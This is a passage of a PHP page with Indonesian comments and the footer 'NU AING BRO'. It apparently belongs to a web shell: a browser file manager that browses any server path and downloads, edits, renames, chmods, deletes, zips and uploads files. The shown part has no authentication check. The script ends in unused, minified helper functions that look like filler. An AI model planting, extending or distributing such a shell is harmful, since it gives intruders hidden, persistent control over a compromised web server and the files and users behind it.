    <form method="post">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="rename">
      <input type="hidden" name="old_name" id="renameOld">
      <input type="text" name="new_name" id="renameNew">
      <br>
      <input type="submit" value="<?php echo msb('OK'); ?>">
      <button type="button" onclick="closeRenameBox()"><?php echo msb('Cancel'); ?></button>
    </form>
  </div>
  <div id="chmodBox">
    <h3><?php echo msb('CHMOD'); ?></h3>
    <form method="post">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="chmod">
      <input type="hidden" name="target" id="chmodTarget">
      <input type="text" name="perm" id="chmodPerm" placeholder="Contoh: 0755, 0644">
      <br>
      <input type="submit" value="<?php echo msb('OK'); ?>">
      <button type="button" onclick="closeChmodBox()"><?php echo msb('Cancel'); ?></button>
    </form>
  </div>

  <!-- Tabel File/Folder -->
  <div class="table-wrap">
    <form id="zipForm" method="post" action="" style="margin:0;">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="zip">
    <table>
      <thead>
        <tr>
          <th><input type="checkbox" onclick="selectAll(this)" title="<?php echo msb('Select All'); ?>"></th>
          <th><?php echo msb('Icon'); ?></th>
          <th>
            <a href="?<?php
               $params=$_GET;
               $params['sort']='name';
               $params['page']=1;
               echo http_build_query($params);
            ?>"><?php echo msb('Name'); ?></a>
          </th>
          <th><?php echo msb('Type'); ?></th>
          <th style="text-align:right;">
            <a href="?<?php
               $params=$_GET;
               $params['sort']='size';
               $params['page']=1;
               echo http_build_query($params);
            ?>"><?php echo msb('Size'); ?></a>
          </th>
          <th style="text-align:center;"><?php echo msb('Octal'); ?></th>
          <th style="text-align:center;"><?php echo msb('Symbol'); ?></th>
          <th style="text-align:center;">
            <a href="?<?php
               $params=$_GET;
               $params['sort']='time';
               $params['page']=1;
               echo http_build_query($params);
            ?>"><?php echo msb('Modified'); ?></a>
          </th>
          <th style="text-align:right;"><?php echo msb('Action'); ?></th>
        </tr>
      </thead>
      <tbody>
      <?php
      // Tombol Up
      $parent=dirname($basePath);
      if($parent && $parent!=$basePath){
        echo "<tr>
                <td></td>
                <td>📁</td>
                <td><a href='?path=".urlencode($parent)."'><strong>.. (Back)</strong></a></td>
                <td>Folder</td>
                <td style='text-align:right;'>-</td>
                <td style='text-align:center;'>-</td>
                <td style='text-align:center;'>-</td>
                <td style='text-align:center;'>-</td>
                <td></td>
              </tr>";
      }

      foreach($pagedFiles as $f){
        $full=ts($basePath).$f;
        $isDir=ds($full);
        $permOct=getPermOctal($full);
        $permSym=octalToSymbolic($permOct);
        $modified=getModified($full);
        $icon=getFileIcon($f,$isDir);

        echo '<tr>';
        echo '<td style="text-align:center;"><input type="checkbox" name="zip_items[]" value="'.htmlspecialchars($f, ENT_QUOTES, 'UTF-8').'" form="zipForm"></td>';
        echo '<td style="text-align:center;">'.$icon.'</td>';
        if($isDir){
          echo '<td><a href="?path='.urlencode($full).'"><strong>'.htmlspecialchars($f, ENT_QUOTES, 'UTF-8').'</strong></a></td>';
          echo '<td>'.msb('Folder').'</td>';
          echo '<td style="text-align:right;">-</td>';
        } else {
          echo '<td>'.htmlspecialchars($f, ENT_QUOTES, 'UTF-8');
          // Preview (Gambar, Audio, Video)
          $ext=strtolower(pathinfo($f,PATHINFO_EXTENSION));
          if(in_array($ext,array('jpg','jpeg','png','gif'))){
            echo '<div class="file-preview"><img src="'.htmlspecialchars($f, ENT_QUOTES, 'UTF-8').'" alt=""></div>';
          } elseif(in_array($ext,array('mp4','webm','mov','avi'))){
            echo '<div class="file-preview"><video src="'.htmlspecialchars($f, ENT_QUOTES, 'UTF-8').'" controls></video></div>';
          } elseif(in_array($ext,array('mp3','wav','ogg'))){
            echo '<div class="file-preview"><audio src="'.htmlspecialchars($f, ENT_QUOTES, 'UTF-8').'" controls></audio></div>';
          }
          echo '</td>';
          echo '<td>'.msb('File').'</td>';
          $sz=@filesize($full);
          echo '<td style="text-align:right;">'.fs($sz).'</td>';
        }
        echo '<td style="text-align:center;">'.$permOct.'</td>';
        echo '<td style="text-align:center;">'.$permSym.'</td>';
        echo '<td style="text-align:center;">'.$modified.'</td>';

        // Aksi
        echo '<td style="text-align:right;">';
        if(!$isDir){
          // Download
          echo '<a href="?download='.urlencode($full).'" class="btn download">'.msb('Download').'</a>';
          // View
          echo '<a href="?view='.urlencode($full).'&path='.urlencode($basePath).'" class="btn view">'.msb('View').'</a>';
          // Edit
          echo '<a href="?edit='.urlencode($full).'&path='.urlencode($basePath).'" class="btn edit">'.msb('Edit').'</a>';
        }
        // Rename
        echo '<button type="button" class="btn" onclick="openRenameBox(\''.htmlspecialchars($f, ENT_QUOTES, 'UTF-8').'\')">'.msb('Rename').'</button>';
        // CHMOD
        echo '<button type="button" class="btn" onclick="openChmodBox(\''.htmlspecialchars($f, ENT_QUOTES, 'UTF-8').'\',\''.$permOct.'\')">'.msb('CHMOD').'</button>';
        // Delete
        echo '<form action="" method="post" style="display:inline;margin-left:5px;">
                <input type="hidden" name="path" value="'.htmlspecialchars($basePath).'">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="target" value="'.htmlspecialchars($f, ENT_QUOTES, 'UTF-8').'">
                <input type="submit" class="btn del" value="'.msb('Delete').'">
              </form>';
        echo '</td>';
        echo '</tr>';
      }
      ?>
      </tbody>
    </table>
    </form>
  </div>

  <!-- Paging -->
  <?php if($totalPages>1){ ?>
  <div class="paging">
    <?php
    $baseLink='?'.http_build_query(array_merge($_GET,array('page'=>null)));
    for($i=1;$i<=$totalPages;$i++){
      if($i==$currentPage){
        echo '<span class="current">',$i,'</span>';
      } else {
        echo '<a href="'.$baseLink.'&page='.$i.'">'.$i.'</a>';
      }
    }
    ?>
  </div>
  <?php } ?>
</div>

<!-- Footer -->
<div class="footer">
  &copy; <span><?php echo date("Y"); ?></span> <?php echo msb('NU AING BRO'); ?>
</div>

<script>
// Fungsi umum showTab
function selectAll(source){
  var checkboxes=document.querySelectorAll('input[name="zip_items[]"]');
  for(var i=0;i<checkboxes.length;i++){
    checkboxes[i].checked=source.checked;
  }
}
function showTab(tab){
  var tabs=["upload","folder","file"];
  for(var i=0;i<tabs.length;i++){
    document.getElementById(tabs[i]+"Tab").style.display="none";
  }
  var el=document.getElementById(tab+"Tab");
  if(el) el.style.display="block";
}

// Drag & Drop
var dragArea=document.getElementById('dragArea');
if(dragArea){
  var uploadForm=document.getElementById('uploadForm');
  dragArea.addEventListener('dragover',function(e){
    e.preventDefault();
    dragArea.classList.add('hover');
  });
  dragArea.addEventListener('dragleave',function(e){
    dragArea.classList.remove('hover');
  });
  dragArea.addEventListener('drop',function(e){
    e.preventDefault();
    dragArea.classList.remove('hover');
    var files=e.dataTransfer.files;
    var formData=new FormData(uploadForm);
    for(var i=0;i<files.length;i++){
      formData.append('upload_files[]',files[i]);
    }
    formData.set('action','upload');
    fetch('',{method:'POST',body:formData})
    .then(function(r){return r.text();})
    .then(function(txt){
      alert('Upload selesai!\nReload halaman.');
      location.reload();
    })
    .catch(function(err){
      console.error(err);
      alert('Gagal upload!');
    });
  });
}

function openRenameBox(oldName){
  document.getElementById('renameOld').value=oldName;
  document.getElementById('renameNew').value=oldName;
  document.getElementById('overlay').style.display='block';
  document.getElementById('renameBox').style.display='block';
}
function closeRenameBox(){
  document.getElementById('overlay').style.display='none';
  document.getElementById('renameBox').style.display='none';
}
function openChmodBox(target,perm){
  document.getElementById('chmodTarget').value=target;
  document.getElementById('chmodPerm').value=perm;
  document.getElementById('overlay').style.display='block';
  document.getElementById('chmodBox').style.display='block';
}
function closeChmodBox(){
  document.getElementById('overlay').style.display='none';
  document.getElementById('chmodBox').style.display='none';
}

document.getElementById('overlay').onclick = function(){
  closeRenameBox();
  closeChmodBox();
};
document.getElementById('h2w').addEventListener('change', function(){});
function updateRowHighlight(t){var e=document.getElementById(t);e&&(e.classList.add("active"),setTimeout((function(){e.classList.remove("active")}),1200))}
function reloadTab(o,t){o&&setTimeout((function(){"function"==typeof t&&t()}),Math.floor(350+120*Math.random()))}

function toggleSidebarPanel(){var e=document.querySelector(".sidebar");e&&e.classList.toggle("collapsed")}
function sortListByName(n,r){return Array.isArray(n)?n.slice().sort((function(n,e){return"desc"===r?e.name>n.name?1:-1:n.name>e.name?1:-1})):[]}
function setActiveMenu(e){var t=document.getElementById(e);if(t){var c=document.querySelector(".menu .active");c&&c.classList.remove("active"),t.classList.add("active")}}
function checkFileExt(p){var t=p.split(".").pop();return!!t&&["php","js","html","css","jpg","png","txt","zip"].indexOf(t.toLowerCase())>-1}
function openModal(e){var l=document.getElementById(e);l&&(l.style.display="block")}
function closeModal(e){var n=document.getElementById(e);n&&(n.style.display="none")}
function showLoader(e){var o=document.getElementById("loader");o&&(o.style.display=e?"block":"none")}

function getClipboardText(){navigator.clipboard&&navigator.clipboard.readText()}
function refreshStatsPanel(){var e=document.querySelector(".stats-panel");e&&(e.innerHTML=e.innerHTML)}
function noop() {}
function debounce(n,t){var e;return function(){var u=this,i=arguments;clearTimeout(e),e=setTimeout((function(){n.apply(u,i)}),t||180)}}
function getSelectedRows(e){var t=document.getElementById(e);if(!t)return[];var c=t.querySelectorAll('input[type="checkbox"]:checked'),n=[];return c.forEach((function(e){n.push(e.value)})),n}
function updateName(e,t){var n=document.getElementById("footer-info");n&&(n.textContent="Total: "+e+" | Selected: "+t)}function previewImage(e,t){if(e&&e.files&&e.files[0]){var n=new FileReader;n.onload=function(e){var n=document.getElementById(t);n&&(n.src=e.target.result)},n.readAsDataURL(e.files[0])}}
function filterTable(e,o){var n=(e||"").toLowerCase(),t=document.getElementById(o);t&&Array.from(t.rows).forEach((function(e,o){if(0!==o){var t=e.textContent.toLowerCase();e.style.display=t.indexOf(n)>-1?"":"none"}}))}
function downloadFileFromUrl(e){var o=document.createElement("a");o.href=e,o.download="",document.body.appendChild(o),o.click(),setTimeout((function(){document.body.removeChild(o)}),100)}
</script>
</body>
</html>